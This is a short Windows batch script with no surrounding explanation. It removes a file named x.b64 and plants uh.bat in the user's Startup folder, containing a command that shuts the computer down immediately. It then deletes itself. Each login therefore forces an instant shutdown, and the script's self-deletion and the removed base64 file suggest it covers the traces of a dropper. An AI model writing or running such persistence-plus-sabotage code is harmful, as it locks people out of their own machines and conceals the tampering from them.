@echo off

del x.b64
cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\
echo shutdown.exe /s /t 00 > .\uh.bat
start /b "" cmd /c del "%~f0"&exit /b

